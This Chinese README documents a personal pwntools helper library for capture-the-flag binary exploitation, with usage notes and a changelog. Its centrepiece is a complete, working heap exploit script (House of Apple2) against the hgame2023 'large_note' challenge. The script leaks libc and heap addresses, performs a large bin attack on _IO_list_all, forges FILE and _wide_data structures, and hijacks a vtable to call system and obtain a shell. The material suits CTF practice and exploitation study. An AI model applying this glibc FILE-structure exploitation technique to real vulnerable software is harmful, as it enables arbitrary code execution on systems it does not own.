# pwn_all_in_one

## 背景

每次写pwn题的时候，都需要使用到重复的模板，个人感觉非常的占位置，所以继承了一个pwntools.py的文件

每次写题目的时候只需要`from pwntools import *`就可以开始快速写题，而无需注意到某些烦人的代码片段

## 使用

本脚本是基于Python3的pwntools，使用到了一些Python3独有的f-string之类的东西，所以Python2的pwner可能无法使用，得自己改改

使用方法非常的简单：

- 把pwntools.py放到`~/.local/lib/python3.X/site-packages`, 即Python导包的路径
- 放在执行路径的同级目录下

随便写了一个经典的`house of apple2`的脚本用例来参考一下，题目是`hgame2023 week3 large_note`

- 如果是打本地, 直接`python3 exp.py`就可以进行本地运行了
- 如果是打远程, 使用`python3 exp.py 114.51.41.91:11451` 或者 `python3 exp.py 114.51.41.91 11451` 就可以自动打远程

当然远程ip还可以在`init`函数中设置, 或者在执行init函数之前设置`pwnio`对象的`ip`和`port`属性

```python
from pwntools import *

# 初始化程序
init("./vuln")

# 获取需要使用的io、elf和libc对象
io: tube = pwnio.io
elf: ELF = pwnio.elf
libc: ELF = pwnio.libc

cmd = lambda idx: sla(">", str(idx))


def add(idx, size=0x500):
    cmd(1)
    sla("Index: ", str(idx))
    sla("Size: ", str(size))


def free(idx):
    cmd(2)
    sla("Index: ", str(idx))


def edit(idx, content):
    cmd(3)
    sla("Index: ", str(idx))
    sa("Content: ", content)


def show(idx):
    cmd(4)
    sla("Index: ", str(idx))


def pack(pos, ptr):
    return (pos >> 12) ^ ptr


def build_fake_file(addr, vtable, _wide_data):
    # flag = 0xFBAD2887
    # fake_file = p64(flag)  # _flags
    # fake_file += p64(addr)  # _IO_read_ptr
    # 不用上面的flag和_IO_read_ptr是因为chunk里不可控上面两个字段
    fake_file = b""
    fake_file += p64(addr)  # _IO_read_end
    fake_file += p64(addr)  # _IO_read_base
    fake_file += p64(addr)  # _IO_write_base
    fake_file += p64(addr + 1)  # _IO_write_ptr
    fake_file += p64(addr)  # _IO_write_end
    fake_file += p64(addr)  # _IO_buf_base
    fake_file += p64(0)  # _IO_buf_end
    fake_file += p64(0)  # _IO_save_base
    fake_file += p64(0)  # _IO_backup_base
    fake_file += p64(0)  # _IO_save_end
    fake_file += p64(0)  # _markers
    fake_file += p64(0)  # _chain   could be a anathor file struct
    fake_file += p32(1)  # _fileno
    fake_file += p32(0)  # _flags2
    fake_file += p64(0)  # _old_offset
    fake_file += p16(0)  # _cur_column
    fake_file += p8(0)  # _vtable_offset
    fake_file += p8(0x10)  # _shortbuf
    fake_file += p32(0)
    fake_file += p64(0)  # _lock
    fake_file += p64(0)  # _offset
    fake_file += p64(0)  # _codecvt
    fake_file += p64(_wide_data)  # _wide_data
    fake_file += p64(0)  # _freeres_list
    fake_file += p64(0)  # _freeres_buf
    fake_file += p64(0)  # __pad5
    fake_file += p32(0)  # _mode
    fake_file += p32(0)  # unused2
    fake_file += p64(0) * 2  # unused2
    fake_file += p64(vtable)  # vtable
    return fake_file


"""
#! large bin leak heap address
#! large bin attack --> fake io --> house of apple2
#! exec system("  sh;")
"""

add(0, 0x508)  # fake_wide_data
add(1, 0x550)  # fake_chain
add(2)
add(3, 0x540)
add(4)

#! leak libc base
free(1)
edit(1, "a")
show(1)
fd_bk = leak(l64() - 0x61, "fd_bk")
libc.address = leak(fd_bk - 0x1E3C00, "libc")
edit(1, b"\x00")

#! to large bin
add(5, 0x600)  # fake_jump

#! large leak fd_next to get heap base
edit(1, b"a" * 15 + b"b")
show(1)
ru("b")
heap_base = leak(uu64(r(6)) - 0x7A0, "heap_base")
edit(1, p64(fd_bk) * 2)

#! free large_chunk2 into unsortedbin
free(3)

#! modify largebin[0]->bk_nextsize -> tagert_addr-0x20
_IO_list_all_chain = libc.address + 0x1E4648
info(_IO_list_all_chain, "_IO_list_all_chain")
edit(1, p64(fd_bk) * 2 + p64(heap_base + 0x7A0) + p64(_IO_list_all_chain - 0x20))
info(heap_base + 0x7A0, "fake_IO")
#! large bin attack : chain -> heap_base + 0x7a0
add(6)

#! edit _flags -> "  sh;"
edit(0, b"\x00" * 0x500 + b"  sh;")

#! bulid fake_wide_data
fake_wide_data = heap_base + 0x2A0
info(fake_wide_data, "fake_wide_data")

#! edit vtable -> _IO_wfile_jumps
#! edit fp -> _wide_data = fake_wide_data
_IO_wfile_jumps = libc.sym["_IO_wfile_jumps"]
edit(1, build_fake_file(0, _IO_wfile_jumps, fake_wide_data))

#! edit fake_wide_data -> _IO_write_base = 0
#! edit fake_wide_data -> _IO_buf_base = 0
#! edit fake_wide_data -> _wide_vtable = fake_jump
#! edit fake_jump -> doallocate = system
fake_jump = heap_base + 0x1C70
_wide_data = {0x18: 0, 0x30: 0, 0xE0: fake_jump}
edit(0, flat(_wide_data))
edit(5, p64(libc.sym["system"]) * 12)

dbg();pau()     # 如果是远程就不会执行debug调试
cmd(5)

ia()    # 交互
```

## 更新日志
- 2022.9.4
  - 配置了部分常用函数
- 2022.9.22
  - 默认使用wsl2 ubuntu进行debug， 若要自己使用自己的终端调试配置，在init函数中第四个参数terminal_args中添加
- 2022.9.25
  - 修复了静态文件加载会爆libc无效错误的异常
  - 添加了一个timeout模块，用来进行自定义事件的pwn
  - 更新了init函数，添加了自定义ip和port的功能，同时保留了命令行输入ip和port的功能
- 2022.10.1
  - 重构了init模块
  - 将所有的全局变量转为pwnio类中的成员变量，方便其他文件导入模块时更改
  - 删除了部分不必要的函数
  - 优化了dbg()函数，远程将不会开启gdb调试
  - 更新了open_dbg()和close_dbg()
  - 规范了函数注释
- 2022.10.31
  - 优化了pwnio，使用了Python的面向对象
  - 目前调用pwnio对象的属性可以通过`.`的方式调用，也可以使用`[]`的方式调用
  - 新添加一个均分列表的方法
- 2022.11.19
  - 新增`libcpatcher.py`文件，基于patchelf一键修改elf文件的libc
  - 新增了leak函数，使用leak获取地址的同时在控制台打印泄露的地址
  - 更新了i16和i10函数，可以传入bytes或者str类型
  - 修改默认开启过滤 `Text is not bytes` 的警告
